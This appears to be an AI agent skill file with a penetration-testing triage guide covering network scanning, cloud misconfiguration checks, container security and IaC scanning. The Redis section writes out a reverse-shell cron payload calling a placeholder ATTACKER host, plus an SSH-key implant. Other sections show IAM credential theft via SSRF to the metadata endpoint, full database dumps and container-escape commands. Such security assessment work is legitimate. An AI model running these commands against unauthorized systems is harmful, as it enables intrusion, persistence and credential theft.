---
name: network-cloud-triage
description: Network, cloud, container, and Infrastructure-as-Code security triage — Network scanning, cloud misconfiguration detection, container escape testing, and IaC vulnerability assessment. Use when testing network services, AWS/GCP/Azure security, Docker/Kubernetes, Terraform/CloudFormation, or when user mentions cloud security, container security, or infrastructure security.
---

# NETWORK, CLOUD & INFRASTRUCTURE TRIAGE

**Expand beyond web apps. Test the infrastructure that hosts them.**

---

## 1. NETWORK TRIAGE

### Port Scan & Service Enumeration

```bash
# Quick scan — top 1000 ports
nmap -sV -sC -T4 -oA quick_scan TARGET

# Full scan — all ports
nmap -sV -sC -T4 -p- -oA full_scan TARGET

# UDP scan — top 100
nmap -sU -T4 --top-ports 100 -oA udp_scan TARGET

# Service-specific scripts
nmap --script=http-enum,http-headers,http-methods -p 80,443 TARGET
nmap --script=ssl-enum-ciphers -p 443 TARGET
nmap --script=smb-enum-shares,smb-enum-users -p 445 TARGET
```

### Service-Specific Attacks

```
SERVICE         PORT    ATTACK                          TOOL
═══════════════════════════════════════════════════════════════════
SSH (22)        22      Default creds, key enumeration  hydra, medusa
HTTP (80)       80      Web vulns (see web skills)      nuclei, ffuf
HTTPS (443)     443     SSL/TLS vulns, web vulns         sslscan, nuclei
MySQL (3306)    3306    Default creds, SQLi              hydra, sqlmap
PostgreSQL      5432    Default creds, auth bypass       hydra, metasploit
MongoDB         27017   Auth bypass, default creds       mongod, metasploit
Redis           6379    Unauthenticated access           redis-cli
Elasticsearch  9200    Index enumeration, data leak      curl
Docker API      2375    Unauthenticated containers       curl, docker
Kubernetes      6443    API server access                 kubectl
SMB             445     Null session, EternalBlue         smbclient, enum4linux
RDP             3389    Default creds, BlueKeep          hydra, rdesktop
FTP             21      Anonymous access, default creds  ftp, hydra
SMTP            25      Open relay, user enumeration     smtp-user-enum
DNS             53      Zone transfer, cache poisoning    dig, dnsenum
```

### Redis Attacks

```bash
# Check for unauthenticated access
redis-cli -h TARGET INFO server

# Read data
redis-cli -h TARGET KEYS "*"

# Write SSH key
redis-cli -h TARGET
> config set dir /root/.ssh/
> config set dbfilename authorized_keys
> set x "\n\nssh-rsa AAAA...\n\n"
> save

# Write cron job
redis-cli -h TARGET
> config set dir /var/spool/cron/
> config set dbfilename root
> set x "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
> save
```

### MongoDB Attacks

```bash
# Check for unauthenticated access
mongosh --host TARGET --port 27017

# List databases
mongo --host TARGET --eval "db.adminCommand({listDatabases:1})"

# Dump all data
mongodump --host TARGET --port 27017 --out ./dump
```

### Elasticsearch Attacks

```bash
# List indices
curl -s "http://TARGET:9200/_cat/indices?v"

# Search for sensitive data
curl -s "http://TARGET:9200/_search?q=*&pretty" | head -50

# Dump specific index
curl -s "http://TARGET:9200/index_name/_search?size=1000" > elasticsearch_dump.json
```

---

## 2. CLOUD TRIAGE

### AWS Security

```bash
# Check S3 bucket permissions
aws s3 ls s3://BUCKET_NAME --acl
aws s3api get-bucket-acl --bucket BUCKET_NAME

# List all objects
aws s3 ls s3://BUCKET_NAME --recursive

# Check IAM policies
aws iam list-policies --scope Local
aws iam get-account-authorization-details

# Check EC2 metadata (from SSRF)
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Check Lambda functions
aws lambda list-functions

# Check Security Groups
aws ec2 describe-security-groups --query 'SecurityGroups[*].{GroupId:GroupId,IpPermissions:IpPermissions}'
```

### AWS Misconfigurations to Test

```
MISCONFIGURATION                  IMPACT              SEVERITY
═══════════════════════════════════════════════════════════════════
S3 bucket public read             Data leak            High
S3 bucket public write            Data corruption      High
S3 bucket ACL public              Data leak            High
IAM user with admin access        Full compromise      Critical
IAM policy with * permissions     Privilege escalation High
EC2 with public IP + open ports   Network exposure     High
Lambda with too-permissive role   Cloud compromise     High
Security Group 0.0.0.0/0          Network exposure     Medium
RDS publicly accessible           Database exposure    High
SQS with public access            Message leak         Medium
```

### GCP Security

```bash
# Check storage buckets
gsutil ls gs://BUCKET_NAME/
gsutil iam get gs://BUCKET_NAME/

# Check IAM
gcloud projects get-iam-policy PROJECT_ID

# Check compute instances
gcloud compute instances list

# Check GKE clusters
gcloud container clusters list
```

### Azure Security

```bash
# Check storage accounts
az storage account list --query "[].{name:name,location:location}"

# Check VMs
az vm list --query "[].{name:name,resourceGroup:resourceGroup}"

# Check IAM
az role assignment list --all
```

---

## 3. CONTAINER TRIAGE

### Docker Security

```bash
# List running containers
docker ps

# List all containers (including stopped)
docker ps -a

# Check container privileges
docker inspect CONTAINER_ID | jq '.[0].HostConfig.Privileged'

# Check for sensitive mounts
docker inspect CONTAINER_ID | jq '.[0].Mounts'

# Check container user
docker exec CONTAINER_ID whoami

# Check container capabilities
docker inspect CONTAINER_ID | jq '.[0].HostConfig.CapAdd'

# Escape test — privileged container
docker exec -it CONTAINER_ID mount /dev/sda1 /mnt
docker exec -it CONTAINER_ID chroot /mnt

# Escape test — host filesystem access
docker run -v /:/host -it alpine chroot /host
```

### Container Image Scanning

```bash
# Trivy — scan for vulnerabilities
trivy image IMAGE_NAME:latest
trivy image --severity HIGH,CRITICAL IMAGE_NAME:latest

# Grype — alternative scanner
grype IMAGE_NAME:latest

# Check for secrets in image
trivy image --scanners secret IMAGE_NAME:latest

# Check Dockerfile for issues
hadolint Dockerfile
```

### Docker Misconfigurations

```
MISCONFIGURATION                  IMPACT              SEVERITY
═══════════════════════════════════════════════════════════════════
Privileged container              Container escape     Critical
Host network mode                 Network exposure     High
Host PID namespace                Process escape       High
Sensitive mount (/etc, /var/run)  Host access          Critical
Running as root                   Privilege escalation High
Exposed Docker API (2375)         Full host control    Critical
No resource limits                DoS                  Medium
```

### Kubernetes Security

```bash
# Check RBAC permissions
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets

# List all pods
kubectl get pods --all-namespaces

# Check for privileged pods
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true)'

# Check for host path mounts
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[]?.hostPath)'

# Secret enumeration
kubectl get secrets --all-namespaces

# API server enumeration
kubectl api-resources
kubectl api-versions
```

### Kubernetes Misconfigurations

```
MISCONFIGURATION                  IMPACT              SEVERITY
═══════════════════════════════════════════════════════════════════
Privileged pod                    Container escape     Critical
Host network/PID                  Namespace escape     Critical
Host path mount                   Host access          Critical
RBAC cluster-admin binding        Full cluster control Critical
Anonymous auth enabled            Unauthorized access  High
Etcd unencrypted                  Secret exposure      Critical
Dashboard exposed                 Cluster control      High
```

---

## 4. INFRASTRUCTURE-AS-CODE (IaC) TRIAGE

### Terraform

```bash
# Scan Terraform files
tfsec .
checkov -d .

# Common Terraform issues
checkov -d . --check CKV_AWS_18  # S3 bucket access logging
checkov -d . --check CKV_AWS_20  # S3 bucket public ACL
checkov -d . --check CKV_AWS_23  # Security group rules
```

### CloudFormation

```bash
# Scan CloudFormation templates
cfn-lint template.yaml
checkov -d . --framework cloudformation
```

### IaC Misconfigurations

```
FILE TYPE           MISCONFIGURATION                  IMPACT
═══════════════════════════════════════════════════════════════════
Terraform           Public S3 bucket                  Data leak
Terraform           Open security group              Network exposure
Terraform           Unencrypted database              Data exposure
Terraform           IAM user with * policy           Privilege escalation
CloudFormation      Public RDS instance              Database exposure
CloudFormation      Open ingress rules               Network exposure
Dockerfile          Running as root                  Privilege escalation
Dockerfile          No health check                  Availability
docker-compose      Privileged container             Container escape
Kubernetes YAML     Privileged pod                   Container escape
Kubernetes YAML     Host path mount                  Host access
```

---

## 5. TRIAGE CHECKLIST

```
NETWORK:
- [ ] Full port scan completed
- [ ] All services enumerated
- [ ] Default credentials tested
- [ ] Unauthenticated access tested
- [ ] Known CVEs checked for versions

CLOUD:
- [ ] S3/GCS/Azure storage bucket permissions checked
- [ ] IAM policies reviewed
- [ ] Security groups/network ACLs reviewed
- [ ] Metadata endpoints accessible (SSRF)
- [ ] Lambda/serverless functions checked

CONTAINER:
- [ ] Container privileges checked
- [ ] Image vulnerabilities scanned
- [ ] Secrets in image checked
- [ ] Dockerfile reviewed for misconfig
- [ ] Kubernetes RBAC reviewed

IaC:
- [ ] Terraform/CloudFormation scanned
- [ ] IAM policies in code reviewed
- [ ] Security groups in code reviewed
- [ ] Encryption settings verified
```
